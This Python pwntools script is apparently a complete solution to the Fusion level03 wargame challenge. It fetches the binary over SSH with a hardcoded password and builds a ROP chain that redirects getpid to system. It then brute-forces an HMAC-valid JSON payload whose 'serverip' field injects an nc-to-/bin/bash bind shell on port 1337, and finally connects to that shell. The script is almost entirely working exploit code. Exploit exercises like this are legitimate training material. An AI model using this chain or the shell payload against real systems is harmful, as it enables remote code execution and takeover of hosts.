import json
import uuid

__author__ = '@tomereyz'

from pwn import *
from hashlib import sha1
import hmac

context.clear(arch='i386')


def main(download):
    challenge_series = 'fusion'
    challenge_name = 'level03'
    challenge_port = 20003
    shell_port = 1337
    ssh_client = ssh(user=challenge_series, host=challenge_series, password='godmode')
    if download:
        ssh_client.download('/opt/fusion/bin/{}'.format(challenge_name))
        ssh_client.download('/lib/i386-linux-gnu/libc.so.6')

    e = ELF(challenge_name)
    rop_object = ROP(e)
    e_libc = ELF('libc.so.6')

    # ------- START ROP CHAIN -------
    filter(lambda value_name: rop_object.raw(value_name[0]),
           rop_object.setRegisters({'ebx': (e.got['getpid'] - 0x5d5b04c4) & 0xffffffff}))

    filter(lambda value_name: rop_object.raw(value_name[0]),
           rop_object.setRegisters(
               {'eax': (e_libc.functions['system'].address - e_libc.functions['getpid'].address) & 0xffffffff}))

    rop_object.raw('A' * 8)

    rop_object.call(0x080493fe)  # add [ebx + 0x5d5b04c4], eax ; ret

    rop_object.call('memcpy')
    rop_object.raw(rop_object.search(move=16).address)
    rop_object.raw(e.bss())
    rop_object.raw(e.got['getpid'])
    rop_object.raw("\\u0400\\u0000")

    rop_object.call('memcpy')
    rop_object.raw(rop_object.search(move=16).address)
    rop_object.raw(e.bss() + 8)
    rop_object.raw(e.symbols['gServerIP'])
    rop_object.raw("\\u0400\\u0000")

    rop_object.migrate(e.bss())

    # ------- END ROP CHAIN -------

    r = remote(host=challenge_series, port=challenge_port)
    pause()
    token = r.recvline().strip().strip('\"')
    log.info('token: {token}'.format(token=token))

    title_json_payload = 'A' * 127 + '\\u' + 'A' * 4 + cyclic(31) + rop_object.chain() + '\x00'

    start_time = time.time()
    while True:
        json_data = {'tags': ['1', '2'], 'title': title_json_payload,
                     'contents': ''.join(map(lambda _: chr(random.randint(1, 255)), xrange(5))),
                     'serverip': 'mkfifo {path_temp_file} ; nc -lk {shell_port} 0<{path_temp_file} | /bin/bash 1>{path_temp_file}'.format(
                         shell_port=shell_port, path_temp_file='/tmp/' + str(uuid.uuid4()))}
        json_payload = json.dumps(json_data, ensure_ascii=False).strip()
        payload = token + '\n' + json_payload + '\n'
        hashed = hmac.new(token, payload, sha1).digest()
        log.info('{:20} : elapsed time {:20}'.format(str(ord(hashed[0])) + ' ' + str(ord(hashed[1])),
                                                     str(time.time() - start_time)))
        if not ord(hashed[0]) and not ord(hashed[1]):
            break
    log.info(payload)
    r.sendline(payload.strip())
    pause()
    r.close()
    time.sleep(5)
    r = remote(host=challenge_series, port=1337)
    r.interactive()


if __name__ == '__main__':
    main(download=True)
